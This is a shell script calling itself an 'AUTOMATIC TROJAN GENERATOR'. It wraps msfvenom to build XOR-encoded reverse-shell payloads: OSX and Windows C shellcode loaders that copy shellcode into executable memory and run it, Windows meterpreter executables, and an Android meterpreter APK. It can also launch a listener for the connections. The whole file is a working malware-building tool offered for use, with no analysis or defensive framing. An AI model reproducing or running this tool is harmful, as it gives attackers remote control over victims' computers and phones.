echo "************************************************"
echo -e "*\033[1;32m AUTOMATIC TROJAN GENERATOR \033[0m                  *"
echo "************************************************"
echo -e "\033[1;31m x64 or x86: \033[0m"
read sysnum
echo -e "\033[1;35m Listening IP address: \033[0m"
read LHOSTNUM
echo "Port to listen: "
read LPORTNUM
echo -e "\033[1;32m [+] \033[0m \033[1;33m UNIX -> UNIX C \033[0m | W_meterpreter -> Windows | W_shellcode -> Windows C shellcode | AND -> Android meterpreter shell"
read sys
if [ $sys == "UNIX" ]; then
    echo -e "generating \033[1;32m UNIX \033[0m shellcode binary"
    /opt/metasploit-framework/bin/msfvenom -p osx/$sysnum/shell_reverse_tcp -e $sysnum/xor LHOST=$LHOSTNUM LPORT=$LPORTNUM -f c > tempshellcode.c
    echo "#include <sys/mman.h>" >> UNIX_shellcode.c
    echo "#include <string.h>" >> UNIX_shellcode.c
    cat tempshellcode.c >> UNIX_shellcode.c
    echo "int main(int argc, char **argv){" >> UNIX_shellcode.c
    echo "void *ptr = mmap(0, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);" >> UNIX_shellcode.c
    #echo "unsigned char shell_code[] = ;" >> shellcode.c
    echo "memcpy(ptr,buf,sizeof buf);" >> UNIX_shellcode.c
    echo "void (*fp)() = (void (*)())ptr;" >> UNIX_shellcode.c
    echo "fp();" >> UNIX_shellcode.c
    echo "}" >> UNIX_shellcode.c
    rm -f tempshellcode.c
    clang UNIX_shellcode.c -o UNIX_shellcode
    #rm -f OSX_shellcode.c
    echo "[+] generation completed"
    echo "Start listening now? Y/N"
    read listen
    if [ $listen == 'Y' ]; then
        ./run_listen.sh $LPORTNUM $LHOSTNUM "osx/$sysnum/shell_reverse_tcp"
        echo "osx/$sysnum/shell_reverse_tcp"
    fi
elif [ $sys == "W_meterpreter" ]; then
    echo "[+] generating windows meterpreter"
    echo "Encoder iteration: "
    read iter
    if [ $sysnum == "x64" ]; then
        /opt/metasploit-framework/bin/msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows --arch x64 -f exe -e $sysnum/xor -i $iter LHOST=$LHOSTNUM LPORT=$LPORTNUM > win_x64.exe
    else
        /opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp -e $sysnum/xor -i $iter --platform windows -f exe --arch x86 LHOST=$LHOSTNUM LPORT=$LPORTNUM > win_x86.exe
    fi
    read listen
elif [ $sys == "W_shellcode" ]; then
    echo "[+] generating \033[1;32m windows \033[0m shellcode"
    echo "Encoder iteration: "
    read iteration_SHELL
    if [ $sysnum == 'x86' ]; then
        /opt/metasploit-framework/bin/msfvenom -p  windows/meterpreter/reverse_tcp -e $sysnum/xor -i $iteration_SHELL -b '\x00' --platform windows --arch x86 LHOST=$LHOSTNUM LPORT=$LPORTNUM -f c >> WIN_shellcode.c
    else
        /opt/metasploit-framework/bin/msfvenom -p windows/x64/meterpreter/reverse_tcp -e $sysnum/xor -i $iteration_SHELL -b '\x00' LHOST=$LHOSTNUM LPORT=$LPORTNUM -f c >> WIN_shellcode.c
    fi
    echo "main(){" >> WIN_shellcode.c
    echo "Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);" >> WIN_shellcode.c
    echo "memcpy(Memory, buf, sizeof(buf));" >> WIN_shellcode.c
    echo "((void(*)())Memory)();" >> WIN_shellcode.c
    echo "}" >> WIN_shellcode.c
    read listen
    if [ $listen == 'Y' ]; then
        ./run_listen.sh $LPORTNUM $LHOSTNUM "windows/meterpreter/reverse_tcp"
    fi
elif [ $sys == 'AND' ]; then
    echo "[+] Generating Android Payload"
    /opt/metasploit-framework/bin/msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOSTNUM LPORT=$LPORTNUM >> Android.apk
fi








